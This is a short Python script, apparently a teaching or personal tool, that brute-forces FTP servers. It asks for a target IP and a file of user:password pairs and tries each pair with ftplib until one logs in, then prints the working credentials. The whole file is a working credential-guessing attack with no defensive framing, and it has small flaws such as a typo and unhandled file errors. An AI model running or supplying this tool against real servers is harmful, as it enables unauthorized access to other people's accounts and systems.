#!/usr/bin/python3
#brute force ftp specifying a creds file

import ftplib

def bruteLogin(hostname, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print("[!] File doesn't exist!")
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\n')
        print("[+] Trying: " + userName + "/" + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(userName, passWord)
            print("[+] Login succeeded with: " + userName + "/" + passWord)
            ftp.quit()
            return(userName, passWord)
        except:
            pass
    print("[-] Password is not in this list")


host = input("[*] Target's IP: ")
passwdFile = input("[*] Path to login redentials, format 'user:password': ")
bruteLogin(host, passwdFile)
